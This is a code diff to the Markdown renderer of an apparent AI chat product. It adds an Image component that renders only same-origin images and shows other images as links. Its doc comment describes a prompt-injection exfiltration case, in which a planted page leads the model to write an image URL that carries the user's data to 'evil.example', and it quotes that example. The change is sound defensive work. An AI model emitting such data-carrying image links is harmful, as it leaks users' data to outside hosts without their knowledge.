@@ -30,7 +30,7 @@ function useKatex(text: string): Katex | null {
   }, [needed, loaded])
   return loaded
 }
-const components: Components = { pre: CodeBlock, a: Link }
+const components: Components = { pre: CodeBlock, a: Link, img: Image }
 
 /**
  * Renders model output (see `Markdown`, which loads this). Raw HTML in the text is not rendered. Memoized: a
@@ -75,6 +75,33 @@ function CodeBlock({ node, ...props }: ComponentProps<'pre'> & ExtraProps) {
       </div>
       <pre {...props} />
     </div>
+  )
+}
+
+/**
+ * Shows only images chibot serves. An answer written under the influence of a
+ * planted page can hold an image whose address carries the user's data
+ * (`![](https://evil.example/c?d=…)`); a browser that loads it has sent the
+ * data without a click. Any other image is a link to open on purpose.
+ */
+function Image({
+  node: _node,
+  src,
+  alt,
+  ...props
+}: ComponentProps<'img'> & ExtraProps) {
+  if (!src) return null
+  const own = URL.parse(src, location.origin)?.origin === location.origin
+  if (own) return <img src={src} alt={alt} {...props} />
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noopener noreferrer"
+      title="Not loaded automatically: open it to see the image"
+    >
+      {alt || 'Image'}
+    </a>
   )
 }
 
